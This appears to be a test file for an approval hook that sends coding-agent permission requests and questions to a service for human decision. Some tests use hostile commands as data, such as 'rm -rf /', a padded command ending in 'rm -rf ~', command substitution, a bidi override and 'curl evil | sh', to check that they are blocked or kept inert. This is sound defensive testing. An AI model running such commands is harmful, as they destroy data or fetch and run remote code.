// SPDX-License-Identifier: GPL-3.0-or-later
// Copyright (C) 2026 Phoenix contributors
//
// The approval hook end to end against an in-process fake Core: in-process through
// decideApproval, and as a real subprocess for the "stdout is one JSON line or empty" contract.
// Plus the hook entries `claude-hooks` / `codex-hooks` print. Never runs a real agent.
import { spawn } from "node:child_process";
import { join } from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import { decideApproval } from "../src/approval-hook";
import { claudeHooksConfig } from "../src/claude";
import { run } from "../src/cli";
import { codexHooksConfig } from "../src/approval-codex";
import { isRecord } from "../src/guards";
import { approvalDigest } from "../src/approval-map";
import {
  decided,
  ID,
  pendingThen,
  startFakeCore,
  TOKEN_FOR_TESTS,
  type FakeCore,
  type Script,
} from "./approval-core";
import { CWD, HOOKS, SESSION } from "./fixtures";

const common = { session_id: SESSION, cwd: CWD, permission_mode: "default" };
const PERMISSION = {
  ...common,
  hook_event_name: "PermissionRequest",
  tool_name: "Bash",
  tool_input: { command: "npm test", description: "Run the tests" },
};
const QUESTION_INPUT = {
  questions: [
    {
      question: "Which framework?",
      header: "Framework",
      options: [{ label: "React" }, { label: "Vue" }],
    },
    {
      question: "Which checks?",
      header: "Checks",
      multiSelect: true,
      options: [{ label: "lint" }, { label: "types" }],
    },
  ],
};
const QUESTION = {
  ...common,
  hook_event_name: "PreToolUse",
  tool_name: "AskUserQuestion",
  tool_input: QUESTION_INPUT,
};

let core: FakeCore | undefined;
afterEach(async () => {
  await core?.close();
  core = undefined;
});

async function decide(script: Script, payload: unknown, argv: string[] = []) {
  core = await startFakeCore(script);
  return decideApproval(argv, typeof payload === "string" ? payload : JSON.stringify(payload), {
    coreUrl: core.url,
    token: TOKEN_FOR_TESTS,
  });
}

/** What the process would print: nothing, or exactly one line of JSON. */
function stdoutOf(result: { line: string | null }): string {
  return result.line === null ? "" : `${result.line}\n`;
}
function expectOneJsonLineOrNothing(out: string) {
  if (out === "") return;
  expect(out.endsWith("\n")).toBe(true);
  expect(out.slice(0, -1)).not.toMatch(/[\n\r]/);
  expect(isRecord(JSON.parse(out))).toBe(true);
}

describe("approval hook: PermissionRequest", () => {
  it("allow → the Claude Code allow decision", async () => {
    const result = await decide(pendingThen(decided({ behavior: "allow" })), PERMISSION);
    expect(JSON.parse(result.line!)).toEqual({
      hookSpecificOutput: { hookEventName: "PermissionRequest", decision: { behavior: "allow" } },
    });
    expectOneJsonLineOrNothing(stdoutOf(result));
    // What Core was asked: a permission request for this session, project and command.
    expect(core!.hits[0]!.body).toMatchObject({
      kind: "permission",
      agent: "claude-code",
      session_id: SESSION,
      project: CWD,
      tool: "Bash",
      input_summary: { command: "npm test", description: "Run the tests" },
      timeout_ms: 120_000,
    });
  });

  it("deny → the deny decision with its message", async () => {
    const result = await decide(
      pendingThen(decided({ behavior: "deny", message: "Not on main" })),
      PERMISSION,
    );
    expect(JSON.parse(result.line!)).toEqual({
      hookSpecificOutput: {
        hookEventName: "PermissionRequest",
        decision: { behavior: "deny", message: "Not on main" },
      },
    });
  });

  it("always → a plain allow; the rule is Phoenix's, no updatedPermissions leaves the hook", async () => {
    const result = await decide(
      pendingThen(
        decided({
          behavior: "allow",
          always: { ttl_minutes: 60, pattern: "npm test *" },
          updatedPermissions: [{ type: "addRules" }],
        }),
      ),
      PERMISSION,
    );
    expect(JSON.parse(result.line!)).toEqual({
      hookSpecificOutput: { hookEventName: "PermissionRequest", decision: { behavior: "allow" } },
    });
    expect(result.line).not.toMatch(/always|updatedPermissions|ttl/);
  });

  it("a policy deny decided on create is returned as a real deny, with no wait", async () => {
    const result = await decide(
      (_hit, req) => ({
        status: 201,
        body: {
          id: ID,
          digest: approvalDigest(req!),
          status: "decided",
          decision: { behavior: "deny", message: "Blocked by policy" },
          decided_by: "policy",
        },
      }),
      PERMISSION,
    );
    expect(JSON.parse(result.line!).hookSpecificOutput.decision).toEqual({
      behavior: "deny",
      message: "Blocked by policy",
    });
    expect(core!.hits).toHaveLength(1);
  });

  it("sends the Codex agent name and a Codex-shaped summary", async () => {
    const codex = {
      ...PERMISSION,
      tool_name: "apply_patch",
      tool_input: { command: "*** Begin Patch\n*** Update File: src/a.ts\n+SECRET\n" },
    };
    const result = await decide(pendingThen(decided({ behavior: "allow" })), codex, [
      "--agent",
      "codex",
    ]);
    expect(result.line).not.toBeNull();
    expect(core!.hits[0]!.body).toMatchObject({
      agent: "codex",
      tool: "apply_patch",
      input_summary: { path: "src/a.ts" },
    });
    expect(JSON.stringify(core!.hits[0]!.body)).not.toContain("SECRET");
  });

  it("passes --timeout-ms to Core as timeout_ms", async () => {
    await decide(pendingThen(decided({ behavior: "allow" })), PERMISSION, [
      "--timeout-ms",
      "30000",
    ]);
    expect(core!.hits[0]!.body).toMatchObject({ timeout_ms: 30_000 });
  });
});

describe("approval hook: AskUserQuestion", () => {
  const answers = { "Which framework?": "Vue", "Which checks?": "lint,types" };

  it("single and multi-select answers → allow with updatedInput", async () => {
    const result = await decide(pendingThen(decided({ behavior: "allow", answers })), QUESTION);
    expect(JSON.parse(result.line!)).toEqual({
      hookSpecificOutput: {
        hookEventName: "PreToolUse",
        permissionDecision: "allow",
        updatedInput: { ...QUESTION_INPUT, answers },
      },
    });
    expectOneJsonLineOrNothing(stdoutOf(result));
    expect(core!.hits[0]!.body).toMatchObject({ kind: "question" });
  });

  it("an answer naming a label that does not exist → no decision", async () => {
    const result = await decide(
      pendingThen(
        decided({ behavior: "allow", answers: { ...answers, "Which framework?": "Svelte" } }),
      ),
      QUESTION,
    );
    expect(result.line).toBeNull();
    expect(result.note).toBe("decision does not fit the request");
  });

  it("an invalid label inside a multi-select → no decision", async () => {
    const result = await decide(
      pendingThen(
        decided({ behavior: "allow", answers: { ...answers, "Which checks?": "lint,e2e" } }),
      ),
      QUESTION,
    );
    expect(result.line).toBeNull();
  });

  it("five questions are not sent to Core at all", async () => {
    const five = Array.from({ length: 5 }, (_, i) => ({
      question: `Q${i}?`,
      header: "H",
      options: [{ label: "a" }],
    }));
    const result = await decide(pendingThen(decided({ behavior: "allow" })), {
      ...QUESTION,
      tool_input: { questions: five },
    });
    expect(result.line).toBeNull();
    expect(core!.hits).toHaveLength(0);
  });
});

describe("approval hook: no decision (fail open)", () => {
  const expectNone = (result: { line: string | null }) => {
    expect(result.line).toBeNull();
    expect(stdoutOf(result)).toBe("");
  };

  it("terminal → no decision", async () => {
    expectNone(
      await decide(
        pendingThen((digest) => ({ status: 200, body: { id: ID, digest, status: "terminal" } })),
        PERMISSION,
      ),
    );
  });

  it("id mismatch → no decision", async () => {
    expectNone(
      await decide(
        pendingThen((digest) => ({
          status: 200,
          body: {
            id: `apr_${"00ff".repeat(6)}`,
            digest,
            status: "decided",
            decision: { behavior: "allow" },
          },
        })),
        PERMISSION,
      ),
    );
  });

  it("digest mismatch → no decision", async () => {
    expectNone(
      await decide(
        pendingThen(() => ({
          status: 200,
          body: {
            id: ID,
            digest: "f".repeat(64),
            status: "decided",
            decision: { behavior: "allow" },
          },
        })),
        PERMISSION,
      ),
    );
  });

  it("an answer for a different request in the same session → no decision", async () => {
    // Core answers with the digest of ANOTHER command of the same agent/session/project/tool.
    const other = approvalDigest({
      kind: "permission",
      agent: "claude-code",
      session_id: SESSION,
      project: CWD,
      tool: "Bash",
      input_summary: { command: "rm -rf /" },
      timeout_ms: 120_000,
    });
    expectNone(
      await decide(
        pendingThen(() => ({
          status: 200,
          body: { id: ID, digest: other, status: "decided", decision: { behavior: "allow" } },
        })),
        PERMISSION,
      ),
    );
  });

  it("Core answers 500", async () => {
    expectNone(await decide(() => ({ status: 500, body: { message: "boom" } }), PERMISSION));
  });

  it("Core answers malformed JSON", async () => {
    expectNone(await decide(() => ({ status: 201, raw: "{nope" }), PERMISSION));
  });

  it("Core is down", async () => {
    const result = await decideApproval([], JSON.stringify(PERMISSION), {
      coreUrl: "http://127.0.0.1:9",
      token: TOKEN_FOR_TESTS,
    });
    expectNone(result);
    expect(result.note).toBe("Phoenix Core did not answer");
  });

  it.each([
    ["not JSON", "this is not json"],
    ["empty input", ""],
    ["an unrelated hook", HOOKS.Stop],
    ["a PostToolUse", { ...PERMISSION, hook_event_name: "PostToolUse" }],
    ["a PreToolUse for Bash", { ...QUESTION, tool_name: "Bash" }],
    ["a relative cwd", { ...PERMISSION, cwd: "rel" }],
  ])("%s: nothing is sent and nothing is printed", async (_name, payload) => {
    const result = await decide(pendingThen(decided({ behavior: "allow" })), payload);
    expectNone(result);
    expect(core!.hits).toHaveLength(0);
  });

  it.each([
    ["--agent", "Not Valid"],
    ["--agent", "x".repeat(25)],
    ["--agent", "a;b"],
    ["--timeout-ms", "100"],
    ["--timeout-ms", "abc"],
    ["--timeout-ms", "9999999"],
  ])("invalid %s %s: nothing is sent and nothing is printed", async (flag, value) => {
    const result = await decide(pendingThen(decided({ behavior: "allow" })), PERMISSION, [
      flag,
      value,
    ]);
    expectNone(result);
    expect(core!.hits).toHaveLength(0);
  });

  it("an unknown flag: nothing is sent and nothing is printed", async () => {
    const result = await decide(pendingThen(decided({ behavior: "allow" })), PERMISSION, [
      "--shell",
    ]);
    expectNone(result);
    expect(core!.hits).toHaveLength(0);
  });
});

describe("approval hook: untrusted input stays data", () => {
  it("quotes, newlines, backslashes and unicode in the command never break the JSON", async () => {
    const command = 'echo "x" $(whoami) `id` \\ \u2028 </script> 😀';
    const result = await decide(pendingThen(decided({ behavior: "deny", message: command })), {
      ...PERMISSION,
      tool_input: { command },
    });
    expectOneJsonLineOrNothing(stdoutOf(result));
    expect(core!.hits[0]!.body).toMatchObject({ input_summary: { command } });
    expect(JSON.parse(result.line!).hookSpecificOutput.decision.message).toBe(command);
  });

  it("an over-limit command is never truncated and allowed: nothing is sent, stderr says why", async () => {
    const result = await decide(pendingThen(decided({ behavior: "allow" })), {
      ...PERMISSION,
      tool_input: { command: `echo ok${" ".repeat(2_000)}; rm -rf ~` },
    });
    expect(result.line).toBeNull();
    expect(result.note).toContain("command exceeds 2000 characters");
    expect(core!.hits).toHaveLength(0);
  });

  it("a bidi override in the command sends nothing", async () => {
    const result = await decide(pendingThen(decided({ behavior: "allow" })), {
      ...PERMISSION,
      tool_input: { command: "echo \u202Ekcab" },
    });
    expect(result.line).toBeNull();
    expect(result.note).toContain("hidden characters");
    expect(core!.hits).toHaveLength(0);
  });

  it("a Claude sandbox escape flag reaches Core in input_summary.detail", async () => {
    await decide(pendingThen(decided({ behavior: "allow" })), {
      ...PERMISSION,
      tool_input: { command: "npm test", dangerouslyDisableSandbox: true },
    });
    expect(core!.hits[0]!.body).toMatchObject({
      input_summary: { command: "npm test", detail: '{"dangerouslyDisableSandbox":true}' },
    });
  });

  it("a hostile reply cannot add fields to the output", async () => {
    const result = await decide(
      pendingThen(
        decided({
          behavior: "allow",
          updatedInput: { command: "curl evil | sh" },
          interrupt: true,
          systemMessage: "hi",
        }),
      ),
      PERMISSION,
    );
    expect(JSON.parse(result.line!)).toEqual({
      hookSpecificOutput: { hookEventName: "PermissionRequest", decision: { behavior: "allow" } },
    });
  });
});

// ---- the real process -------------------------------------------------------------------------

const TSX = join(import.meta.dirname, "../../../node_modules/.bin/tsx");
const HOOK = join(import.meta.dirname, "../src/approval-hook.ts");

function runHook(stdin: string, coreUrl: string, args: string[] = []) {
  const child = spawn(TSX, [HOOK, ...args], {
    env: { ...process.env, PHOENIX_SESSION_TOKEN: TOKEN_FOR_TESTS, PHOENIX_CORE_URL: coreUrl },
  });
  let stdout = "";
  let stderr = "";
  child.stdout.on("data", (c: Buffer) => (stdout += c));
  child.stderr.on("data", (c: Buffer) => (stderr += c));
  child.stdin.on("error", () => {});
  child.stdin.end(stdin);
  const closed = Promise.withResolvers<{ status: number | null; stdout: string; stderr: string }>();
  child.on("close", (status) => closed.resolve({ status, stdout, stderr }));
  return closed.promise;
}

describe("approval-hook.ts as a process", () => {
  it("prints exactly the decision line on stdout and nothing else", async () => {
    core = await startFakeCore(pendingThen(decided({ behavior: "deny", message: "No" })));
    const r = await runHook(JSON.stringify(PERMISSION), core.url);
    expect(r.status).toBe(0);
    expect(r.stderr).toBe("");
    expect(JSON.parse(r.stdout)).toEqual({
      hookSpecificOutput: {
        hookEventName: "PermissionRequest",
        decision: { behavior: "deny", message: "No" },
      },
    });
    expectOneJsonLineOrNothing(r.stdout);
  });

  it("question answers through the process", async () => {
    core = await startFakeCore(
      pendingThen(
        decided({
          behavior: "allow",
          answers: { "Which framework?": "React", "Which checks?": "types" },
        }),
      ),
    );
    const r = await runHook(JSON.stringify(QUESTION), core.url);
    expect(r.status).toBe(0);
    expectOneJsonLineOrNothing(r.stdout);
    expect(JSON.parse(r.stdout).hookSpecificOutput.permissionDecision).toBe("allow");
  });

  it("Core down: exit 0, empty stdout, the reason on stderr", async () => {
    const r = await runHook(JSON.stringify(PERMISSION), "http://127.0.0.1:9");
    expect(r).toMatchObject({ status: 0, stdout: "" });
    expect(r.stderr).toMatch(/no approval decision \(Phoenix Core did not answer\)/);
  });

  it("Core answers 500: exit 0, empty stdout", async () => {
    core = await startFakeCore(() => ({ status: 500, body: {} }));
    const r = await runHook(JSON.stringify(PERMISSION), core.url);
    expect(r).toMatchObject({ status: 0, stdout: "" });
  });

  it("garbage on stdin: exit 0, nothing on stdout or stderr", async () => {
    const r = await runHook("\u0000not json", "http://127.0.0.1:9");
    expect(r).toEqual({ status: 0, stdout: "", stderr: "" });
  });
});

// ---- hook settings ----------------------------------------------------------------------------

interface HookEntry {
  matcher?: string;
  hooks: { type: string; command: string; timeout: number; statusMessage?: string }[];
}
const entries = (config: Record<string, unknown>): Record<string, HookEntry[]> => {
  const hooks = config.hooks;
  if (!isRecord(hooks)) throw new Error("no hooks");
  // The shape is produced by our own config functions, which these tests then assert on.
  const typed = hooks as Record<string, HookEntry[]>;
  return typed;
};

describe("hook settings", () => {
  it("without approvals claudeHooksConfig is the observe-only block, unchanged", () => {
    const hooks = entries(claudeHooksConfig("tsx hook.ts"));
    expect(Object.keys(hooks).sort()).toEqual(
      [
        "Notification",
        "PostToolUse",
        "SessionEnd",
        "SessionStart",
        "Stop",
        "UserPromptSubmit",
      ].sort(),
    );
  });

  it("with approvals it adds PermissionRequest and PreToolUse(AskUserQuestion), timeout = decision + 10 s", () => {
    const hooks = entries(claudeHooksConfig("tsx hook.ts", { command: "tsx approval.ts" }));
    expect(hooks.PermissionRequest).toEqual([
      { hooks: [{ type: "command", command: "tsx approval.ts", timeout: 130 }] },
    ]);
    expect(hooks.PreToolUse).toEqual([
      {
        matcher: "AskUserQuestion",
        hooks: [{ type: "command", command: "tsx approval.ts", timeout: 130 }],
      },
    ]);
    // The observe-only entries keep their 5 s.
    expect(hooks.Stop![0]!.hooks[0]).toEqual({
      type: "command",
      command: "tsx hook.ts",
      timeout: 5,
    });
  });

  it.each([
    [5_000, 15],
    [60_000, 70],
    [600_000, 610],
  ])("decision timeout %d ms → settings timeout %d s", (timeoutMs, seconds) => {
    const hooks = entries(claudeHooksConfig("a", { command: "b", timeoutMs }));
    expect(hooks.PermissionRequest![0]!.hooks[0]!.timeout).toBe(seconds);
    expect(entries(codexHooksConfig("b", timeoutMs)).PermissionRequest![0]!.hooks[0]!.timeout).toBe(
      seconds,
    );
  });

  it("codexHooksConfig registers PermissionRequest only", () => {
    expect(codexHooksConfig("tsx approval.ts --agent codex")).toEqual({
      hooks: {
        PermissionRequest: [
          {
            hooks: [
              {
                type: "command",
                command: "tsx approval.ts --agent codex",
                timeout: 130,
                statusMessage: "Waiting for a Phoenix decision",
              },
            ],
          },
        ],
      },
    });
  });
});

describe("phoenix-agent claude-hooks / codex-hooks output", () => {
  async function capture(args: string[]) {
    const writes: string[] = [];
    const original = process.stdout.write.bind(process.stdout);
    process.stdout.write = ((chunk: string | Uint8Array) => {
      writes.push(String(chunk));
      return true;
    }) as typeof process.stdout.write; // test double capturing a CLI that writes to process.stdout
    try {
      const code = await run(args);
      return { code, out: writes.join("") };
    } finally {
      process.stdout.write = original;
    }
  }

  it("claude-hooks prints the observe-only hooks plus the approval hooks", async () => {
    const { code, out } = await capture(["claude-hooks"]);
    expect(code).toBe(0);
    const hooks = entries(JSON.parse(out));
    expect(hooks.Notification![0]!.hooks[0]!.command).toContain("claude-hook.ts");
    const permission = hooks.PermissionRequest![0]!.hooks[0]!;
    expect(permission.command).toContain("approval-hook.ts");
    expect(permission.command).toContain("--agent claude-code");
    expect(permission.command).toContain("--timeout-ms 120000");
    expect(permission.timeout).toBe(130);
    expect(hooks.PreToolUse![0]!.matcher).toBe("AskUserQuestion");
  });

  it("--no-approvals prints only the observe-only hooks", async () => {
    const { out } = await capture(["claude-hooks", "--no-approvals"]);
    expect(Object.keys(entries(JSON.parse(out)))).not.toContain("PermissionRequest");
  });

  it("--approval-timeout-ms changes the decision timeout and the hook timeout together", async () => {
    const { out } = await capture(["claude-hooks", "--approval-timeout-ms", "45000"]);
    const permission = entries(JSON.parse(out)).PermissionRequest![0]!.hooks[0]!;
    expect(permission.command).toContain("--timeout-ms 45000");
    expect(permission.timeout).toBe(55);
  });

  it("codex-hooks prints the PermissionRequest hook for codex", async () => {
    const { code, out } = await capture(["codex-hooks"]);
    expect(code).toBe(0);
    const hooks = entries(JSON.parse(out));
    expect(Object.keys(hooks)).toEqual(["PermissionRequest"]);
    expect(hooks.PermissionRequest![0]!.hooks[0]!.command).toContain("--agent codex");
  });

  it("rejects a timeout outside 5 s..10 min", async () => {
    const { code, out } = await capture(["claude-hooks", "--approval-timeout-ms", "1000"]);
    expect(code).toBe(2);
    expect(out).toBe("");
  });
});
